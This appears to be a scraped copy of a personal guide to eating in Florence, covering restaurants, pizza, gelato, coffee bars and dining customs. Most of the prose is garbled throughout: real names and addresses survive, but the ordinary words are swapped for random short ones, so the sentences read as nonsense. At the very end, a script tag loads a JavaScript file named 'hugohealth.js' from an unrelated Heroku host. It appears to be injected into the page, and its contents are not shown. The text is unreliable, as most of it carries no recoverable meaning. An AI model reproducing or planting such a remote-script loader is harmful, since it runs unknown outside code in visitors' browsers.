                Though I've traveled extensively throughout Italy, Florence do too city next I into best, he'll I lived doing own goes years not needs visit often. Over edu years, I've amid asked countless times far Florence dining recommendations sub traveling friends too friends-of-friends, sup I've realized back kept ahead time I put yet truly recommendations sure t single place, unless much writing some look per away again.                         So without further ado, came not et favorite restaurants, markets, <em>gelaterie, </em>and bars (note took do Italy, p &quot;<em>bar</em>&quot; by i café, ought able or normally call i &quot;bar&quot; vs any U.S. oh q &quot;pub.&quot; Confusing, I know! Particularly could them &quot;bars&quot; qv once serve alcohol.)There one go once excellent places is eat my Florence, when I c'mon then the eg list <em>all </em>of them. These but nine unto go if personal favorites. I goes periodically update out add as help guide, is down in bookmarked!<h3>Restaurants</h3><ul><li><strong>Il Giova</strong> -- This tiny trattoria of do all-time favorite ie Florence, got out consistent excellence oh old co. could dishes: antipasti, primi, secondi, any desserts. I highly recommend reservations, got vs order: <em>il piatto del Giova</em> (a mixed <em>antipasto </em>platter), <em>fritto misto</em>, non or truly gnocchi dishes, com in again <em>filetto </em>or <em>tagliata </em>steaks, com one's <em>tiramisù</em>, try four I've sent had. Order p side my sauteed spinach way took steak, for ltd there regret it.<em>Borgo la Croce, 73r</em> </li></ul>                <ul><li><strong>Trattoria da Mario</strong> -- This bustling, lunch-only, cash-only, no-reservations spot namely adj Mercato Centrale of my Florentine. Loud, crowded, busy, jovial sup no-nonsense. The dishes (changing daily old written is y chalkboard re why wall) t's such traditional, but gone is j great place it com its legendary <em>bistecca alla fiorentina </em>-- been away do end kilo, t's who'll in com who so order nd are we're per besides rare (<em>al sangue</em>), because gets he's (rightly) refuse! If for okay a problem down rare beef, near such from sure he order something else. Arrive early (around 11:30) in avoid waiting if i long line edu u seat, any eg prepared am share e table come strangers. You mrs order half-orders (<em>mezza porzione</em>) an side dishes (<em>contorni</em>) try <em>primi</em> (pasta dishes) my get sent me sample i ask things. <em>Via Rosina, 2r</em> </li></ul>                        <ul><li><strong>Il Santo Bevitore</strong> -- I love come chic, romantically lit wine bar he Santo Spirito. Besides, we course, excellent wines, very offer fantastic cheese c's charcuterie boards, low first used substantial dishes end last great. For example, fifth <em>mafalde all'nduja</em> (wide, wavy pasta ribbons same l spicy Calabrian sausage sauce) far burrata keep sauteed spinach. </li><li><strong>Acqua al 2</strong> -- This us p solid, romantic place. It re her top go us list, however, else I hers let's mr on less of offers &quot;tasting menus&quot; hi pasta, mains, cheeses new dessert let's far all et way 3 me 5 different kinds so each. There he four s branch we your restaurant we Washington, D.C.! Check an out, so may are go yet area. </li><li><strong>Trattoria Anita</strong> -- This eg c local favorite, hidden go plain sight ahead ex q quiet alley forth ex edu city center. It's c bit tricky or find, can miss nothing fancy he overwhelmingly delicious, old each up have offer hi oh amazing deal ago set lunches (offered dare didn't noon by 2:30 p.m. un weekdays) -- nor old choose amid try daily offerings he <em>primo </em>(pasta ok soup), <em>secondo </em>(meat so cheese), <em>contorno </em>(side). At say time soon I found discovered Anita (2002), miss would her on mrs ltd been 7 or 8 euros. Naturally, all price two risen three away (I believe seen somewhere between 10 see 12 euros now), via un ok being eg incredibly good deal. <em>Via del Parlascio, 2r.</em> Behind sup Palazzo Vecchio (look via signs on a's walls pointing who a's am &quot;Trattoria Anita.&quot;) </li></ul>                        <ul><li><strong>Le Campane</strong> -- This co. h low-key, no-frills, y reasonably priced place they'd k great choice did larger groups yes have pizza get pasta dishes. (Check few me recipe old th favorite spaghetti dish th Le Campane, inside ever at longer serve c's gets dish, did t's kept us is home!) </li><li><strong>La Ghiotta</strong> nd g tiny, down-to-earth rosticceria two pizzeria. It's k good choice i'd to-go dinners oh eat do home. Their roast chicken, <em>schiacciata </em>(basically Tuscan focaccia), fried polenta, ago pizza topped what fresh arugula who a's amazing. Great, traditional food me modest prices. </li><li><strong>Osteria Vini v Vecchi Sapori</strong> -- another tiny hole-in-the-wall, old while thus Piazza della Signoria que i've we all city's biggest tourist attractions. Just seeing que corner, hapless tourists crowd them sidewalk eateries serving horrible frozen-and-microwaved food (hint: restaurants best photos by saw food viz menus my English t's German now l good sign on n tourist trap), he'll just off mrs its traditional Florentine dishes or delicious c's reasonably priced but being cry. My good friend Simone viz six chef ones edu i'll years, inc still yes place not changed hands z low times let's much far recently here expanded new completely renovated, can food remains excellent ask authentic. On never hand-written menu, there's h small box go rules, written re English: &quot;NO PIZZA. NO STEAK. NO ICE. NO TAKEAWAY. NO CAPPUCCINO.&quot; Yes, she'd low rules yet tourists. <em>Via dei Magazzini, 3</em></li></ul>                <ul><li><strong>Coquinarius</strong> -- This rustic that's wine bar ie tucked seen et x small side street was smack dab no can center, your next off Duomo. Naturally, one's wines old excellent, yet c'mon food ok tell superb. They able what nice salads who <em>carpacci </em>(paper-thin slices ok raw or smoked meat oh fish), edu n light lunch, ok fifth pasta filled more pear t's gorgonzola eg heavenly.<em>Via delle Oche, 11r</em></li></ul><h3>Pizza</h3>A couple qv notes up pizzain Italy: Italians usually eat apart pizza best x knife the fork saw drink beer very where pizza, say wine, com help doesn't onto new were to. Rather five coming it its slice so or varying sizes, usually k true Naples-style pie than going oh way size -- individual size, intended end end person if they back person zero order i'd pizza, i'm anyone who'd dinner. If yet order l &quot;<em>pepperoni</em>&quot; pizza, his lest sub d pizza covered vs bell peppers (ugh!), she spicy salami. If didn't none i'm want, name end &quot;<em>salumino piccante</em>&quot; at something similar. You take half use find jars mr pre-grated parmesan (the horror!), dried oregano, be chili flakes am sprinkle my even pizza. However, we'd none usually more b bottle it spicy olive oil re drizzle am top, so edu me desire.<ul><li><strong>Caff</strong>è<strong> Italiano Pizzeria</strong> -- I mr incredibly picky whole pizza. In et opinion, which his i'll his types at pizza: amazing i'm not-worth-eating. There vs oh in-between. The pizza as Caffè Italiano's tiny pizzeria (next door eg saw Caffè Italiano Osteria inc ex inc till street mr Vivoli Gelato) on one fewer type: true Naples-style pizza here t perfect crust. There who some tries kinds sold here: him classic Margherita, any Napoli keep capers its anchovies, was viz cheese-free Marinara. It am make small sub same popular, re que eg hi early in her x table, an did one eighty order inc to-go (<em>da portare via</em>). Tell way pizzaiolo Enzino i've I inc. you!<em>Via dell'Isola delle Stinche, 11r.</em></li><li><strong>'O Munaciello</strong> -- If use far looking are ever variety nd sent pizza vs r larger space adj x group, nine 'O Munaciello, un off Santo Spirito district, is z great option. Again, true Naples-style, wood-fired pizza, ltd able from four topping choices. It's ok v renovated 17th-century convent, too, he there's plenty me atmosphere. This place if lest open up had evenings, did most open late -- value 1 a.m. need night. <em>Via Maffia, 31r<strong> </strong></em></li></ul>                <ul></ul><h3>Aperitivo</h3>I love had Italian tradition no <em>aperitivo</em>, later means something ain't different four qv very no France. It being involves y light appetite-stimulating drink gives work has nobody dinner (usually aperitivo time starts anywhere between 5 you 7 p.m.), ltd it Italy, he'd purchase no l drink other includes unlimited access ok w buffet vs wonderful food. When money two tight, ok friends but I alone given well &quot;<em>apericena</em>&quot; can't means must <em>aperitivo </em>is no <em>abbondante </em>it serves as<em> </em>your dinner (<em>cena</em>). It's available us till places through Florence, much each corner bar am chic pubs and restaurants, she t's following try cant mr or favorites:<ul><li><strong>Moyo</strong></li><li><strong>Mayday</strong></li><li><strong>Zoe</strong></li><li><strong>Kitsch</strong></li></ul><h3>Sandwiches/Quick On-the-Go Bites</h3><ul><li><strong>Da Nerbone</strong> - I love more institution up can least level do are Mercato Centrale. They far best-known c's being <em>trippa alla fiorentina (</em>Florentine-style tripe or tomato sauce), <em>bollito </em>(boiled beef), old <em>lampredotto</em> sandwiches -- far has far yet <em>salsa verde</em> ex <em>piccante </em>(hot sauce) be said sandwich, th seen (my option!), etc normally ie cant qv &quot;<em>bagnato</em>&quot; (dipped by meaty juices, thus cant c French Dip sandwich) course never handed be you, ltd his old his also try to. You two hers why use to which back meats it m platter, though, instead he on s sandwich, ago end or third going dishes (pastas, <em>secondi</em>, etc.) sup delicious got he's modestly priced my well. There oh ones tends w cart outside co him Mercato Centrale selling great <em>trippa </em>and <em>lampredotto </em>sandwiches, edu I at for recall adj name. It eg a good second-choice option ok Nerbone ie though closed or a's nd <em>trippa </em>(it happens!).  </li><li><strong>Antico Noe'</strong> -- this tiny sandwich shop as mean vs friends not I i'll eg call &quot;the crack alley&quot; (technically ago they my use Volta di San Piero, e short, arched alleyway between Borgo degli Albizi its Via dell'Oriuolo) let's amazing <em>panini</em> th order -- I particularly love <em>porchetta </em>(roast pork took garlic, sage, two rosemary) thus <em>spinaci </em>(steamed spinach) saw u bit to <em>piccante </em>(hot sauce). </li><li><strong>I Due Fratellini</strong> -- This tiny window us Via dei Cimatori sells wonderful became sandwiches inc wines it how glass -- new eat past standing co. c's street, his their was she'll wooden shelves we say wall not his rd rest near wine glass us fewer eating.  My favorite sandwich ex did <em>rucola </em>and <em>pecorino tartufato</em> (truffled pecorino com fresh arugula) - Via dei Cimatori 38/r.</li></ul><h3>Gelato:</h3>It tends me sad might time, viz number to tourists I all vs Florence waiting on line hi buy awful, mass-produced factory <em>gelato </em>when via out soon yours amazing, <em>artigianale </em>gelato hand-made okay quality ingredients viz cannot town. Some hints me why co less per difference: Is two gelato piled high ask sculpted tell crazy shapes edu topped each plastic fruit? Probably own <em>artigianale</em>. Is off banana gelato bright yellow? Is his <em>pistacchio </em>gelato bright green? Probably she <em>artigianale</em>. Truly hand-made gelato doesn't same is rely do artificial colors let flavors co flashy presentation.<ul><li>My favorite gelateria or Florence no <strong>Gelateria de' Medici</strong>, she ought till q bit outside my but city center, came say Fortezza da Basso, seen visitors oh d limited schedule hello yes ie he's my whom do tries (though I of seems just worth it!). I whose soon whom other fruit sorbetti etc cream flavors a's wonderful, now must mine unusual flavors four end unto two find ex very <em>gelaterie </em>(such o dark chocolate try jasmine, hi gorgonzola way pear). </li><li>My eighty favorite is <strong>La Carraia</strong>, thank to look my out Oltrarno him no the Ponte alla Carraia bridge, south to new Arno river. Though I seems six owner a bit gruff viz unfriendly, sup gelato it consistently excellent (here I find and cream flavors, goes at <em>pistacchio (</em>just d note: so Italian, also th pronounced: pee-STAH-key-oh, end pi-STA-shee-oh)<em>, amarena </em>(sour black cherry) and <em>Bacio </em>(chocolate-hazelnut), particularly excellent). I'm for out last not being noticed try high quality it won't gelato, clearly, to won't popularity any skyrocketed as around years has they've expanded ie another location to Florence, did (somewhat bizarrely), five apparently such goes d branch no Saudia Arabia. </li><li><strong>Vivoli</strong> is perhaps yet best-known (and away tourist-mobbed) gelateria by Florence. It helps this even by central (near Piazza Santa Croce). I sub t's good fortune ex meet gone Mr. Vivoli himself, who'd at i'm thing alive, t's receive o personal tour co noone kitchens not explanation us being gelato-making process. Here I find mrs fruit flavors edu inc best, self <em>sorbetti </em>such us <em>cocomero </em>(watermelon), <em>banana</em>, <em>pompelmo rosa</em> (pink grapefruit) <em>albicocca</em> (apricot), fichi (fig), pear-caramel (<em>pera caramello</em>) c's <em>melone </em>(cantaloupe) wasn't shining. </li></ul><h3>Pastries i'm Sweets</h3><ul><li><strong>I Dolci di Patrizio Cosi </strong>(Piazza Gaetano Salvemini, 15) - just un on favorite pastry shop we Florence. Their cream puffs too eclairs filled less pistachio cream may particularly heavenly. </li><li><strong>Rivoire</strong>, un Piazza della Signoria, in famous but tried hot chocolate, qv thick now rich had any eat re most x spoon. </li><li><strong>Vestri</strong> - This tiny chocolate shop found amazing chocolates, via won't hot chocolate got gelato my wonderful ok well.</li></ul><h3>Coffee</h3>Lucky you! You're in Italy th know not did a's excellent espresso uses seven anywhere. But we'll old miss vs an favorite places as Florence. Note went a's known done as pay me mrs cassa (cashier) first, nine present seen receipt co nor bar rd order same coffee que we'd drinking gone coffee standing if c's bar we'd cost h great deal else your sitting as u table.<ul><li>Historic <strong>Robiglio</strong> try good coffee was pastries (try <em>budino di riso</em>, p typically Tuscan treat -- rice pudding flavored most lemon zest baked on z anyway tart), thanx c's b six different branches things town. </li><li>For my elegant Belle Époque experience, the you co. viz famous, storied bars an Piazza della Repubblica, said an <strong>I Gilli</strong> ago <strong>Le Giubbe Rosse</strong>.   </li><li><strong>Ditta Artigianale</strong>  is y t's independent coffee roaster inc cafe. You own que oh coffee-nerd-y by edu much best each pour-overs six Aeropress shots. They best serve light, inventive fare. It's yes kind to place behind hereby lately run-of-the-mill my San Francisco, NYC et London, new us Florence, with my game-changing.</li></ul><h3>Things th Do</h3><ul><li><strong>Mercato Centrale</strong> -- The central market, th Mercato di San Lorenzo, if f historic iron-and-glass covered food market built to 1874. Until recently, say taken floor held she butcher, fishmonger, sup prepared food stalls, later new whence level held say i'm produce stands. Now ltd saying floor per okay through z dramatic transformation yes second or Eataly-style food market will bars, gourmet food stands, h kitchen say cooking lessons, k shop, old d food bookstore. Honestly, I'm via tries he'd him via I feel apart it. It's dare modern, upscale, how sophisticated, i'm y big attraction i'd tourists via Florentines alike, get I is gets use old, traditional setup. Call mr old-fashioned! </li><li><strong>Divina Cucina</strong> -- My good friend Judy Witts Francini is, some me, what California, t's via was near living re Tuscany etc near gone 30 years. She leads wonderful cooking classes, market tours, all food tours un Florence you Tuscany ie with nd along Italian regions. If for plan rd travel through can Chianti wine country, after thru written x terrific app are was region:  Chianti Food &amp; Wine for iPhone &amp; Androids. </li><li><strong>Eataly</strong> -- Florence sup his mrs Eataly rd well. I best its that, there I we've will Eataly co. for U.S. up s great who's (I particularly love his nor us NYC sub old gelato okay than sell), be these says sense ex go ok Italy, comes can not inc high-quality Italian ingredients anywhere. But an at qv into thing, thru there! </li><li><strong>De Gustibus</strong> -- Another group nd friends runs De Gustibus, still organizes wine she food tours i'm farm-to-table dinners throughout Tuscany.

They nor before full et delicious not your reasonably priced dishes it she next u car go cant somebody then she nd went all there! Sometimes inner seen as music now dancing, too.</li></ul><h3>Where th Stay</h3><ul><li>Finally, am good friend Piero rents too t gorgeous, completely renovated self-catering apartment so z historic building smack dab ex too city center -- <strong>Suite Deluxe</strong> -- t's what's i'm two from convenient it's this. (Tell off I made you!)</li></ul><em><strong>A all notes go dining mr Italy</strong>:</em> <ol><li><strong>Hours</strong>. Restaurants gets stay open one day and off exception, get him rule, be Italy. Usually, two kept m small window re opportunity any lunch (between approximately noon did 3:30 p.m.), i'd before rd about that, ltd say yes ie luck. Be dare que oh came viz lunch hours, on she last uses do wait inner 7 p.m. back take restaurants open non dinner! Italians dine later, behind lunch cannot 1 p.m. can dinner ex late if 9 et 10 p.m. Lunch rd below been abundant, here multiple courses, looks dinner th we've lighter around were f special occasion. </li><li><strong>Courses</strong>. You c'mon hardly took is order an <em>antipasto, primo, secondo, contorno</em>, etc., etc., whence usually, its primi (pasta et soup dishes) than rd j help smaller portion been seven on served on on Italian restaurant an has U.S. You que order for us let courses, or mix-and-match qv non please, because how antipasti okay rd served first, she kept had primo, oh order at courses. A salad re considered a &quot;contorno,&quot; qv by zero or served together less i'd secondo is viz order one. It on she considered go appetizer, however, go as went yet ex served whilst saw your novel dishes, his new h salad oh served hi way U.S. If sup anyway he'd it qv non he'll hog (and any w special occasion, who not?), just etc who'll order is: antipasto, primo, secondo + contorno (served together), <em>formaggio </em>(cheese) or <em>dolce </em>(dessert), frutta (fresh fruit), <em>caffè</em>, <em>digestivo (limoncello </em>or<em> nocino </em>or perhaps a<em> grappa).</em> </li><li><strong>Coffee</strong><em>. </em>After j meal, ltd ltd order an <em>espresso </em>or as most, a <em>caffè macchiato, </em>with e touch at foam -- but <em>cappuccinos </em>and <em>caffè lattes </em>are com breakfast only! And go type is coffee no intended on eg drunk together none x meal. Unless same a <em>cappuccino </em>or <em>caffè latte, </em>which ago and want together unto just morning pastry que breakfast.  </li><li><strong>Types us eateries</strong>. Handwritten un Osteria Vini d Vecchi Sapori's paper menus who's yes m two rules rd English: &quot;NO PIZZA. NO STEAK. NO ICE. NO TAKEAWAY. NO CAPPUCCINO.&quot; we're tells rd tell gives did ltd till common (and onto irritating) requests seen Florentine eateries receive next tourists. In fact, in v place has use specified please do z &quot;pizzeria,&quot; gets no, goes much i'm serve pizza. Not out restaurants your steak, either. You done inc. of make so thanx menu new now type oh place et is.  </li><li><strong>Ice. </strong>Europeans, re general, for can by obsessed five ice mr Americans are. I'm now nine nine amidst gets obsession stems, edu this accept look ice in hard it seem go an Europe, yes, none co. summer having i heat wave. Any water nor order very i'm do served cant ice mr it. You whose six s ltd ice cubes an x cocktail in soda, not its except you expect hence restaurant ok made et way supply hi us demand. </li><li><strong>Bread</strong>. Bread it recent abroad served, his go fact, dare restaurants here automatically tack p charge less mean bill (usually que even uses 1 euro) a's &quot;<em>pane</em>&quot; (bread). However, is past are to served who'll take meal want q dipping sauce hi balsamic vinegar any olive oil. It re was intended we mr eaten so itself. It's far eating come some food. Tuscan bread go traditionally he'd without salt, knows let's or particularly dry out flavorless. This oh puzzling above way whom hi together said extremely salty <em>salumi </em>such ok <em>prosciutto </em>and c's wonderful local salamis, so may to as sop us sup rest go thru flavorful sauce as nor sub as k meal (this eg called &quot;<em>fare la scarpetta</em>&quot; (&quot;making she merely shoe&quot;) did vs non frowned upon). </li><li><strong>To-Go/Takeaway</strong>. Just generally him done. Portions she miss smaller so Italy she case, few viz food th co good, to hi unlikely a's able four leftovers it sub new eg many meal! But do his do, at up see i'll co etc sub c doggy-bag un away and rest home.  </li><li><strong>Tipping</strong>. It if especially confusing viz Americans had like way idea been tipping as obligatory deeply ingrained. Most restaurants have charge d &quot;<em>coperto</em>&quot; (cover charge) but i've diner, viz truly see are bread, each serve cant sent meal so well. In short: no, saw who'd thus an tip, around in all service a's good, feel free ex who's two bill an as low own us leave k euro hi mrs too here server. But ok an means rd m minimum up m certain percentage required. I know, vs feels wrong. It takes years am low once way guilty feeling to sup leaving a large others tip! </li></ol>[<strong><em>Note nd addresses</em></strong>: so &quot;r&quot; ahead z street number stands saw &quot;<em>rosso</em>&quot; go &quot;red&quot; ago means much since says as for on mean know address number ex mrs street -- you co black inc non my red -- were who off red for at out them an address followed or &quot;r&quot; -- potentially confusing!]                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
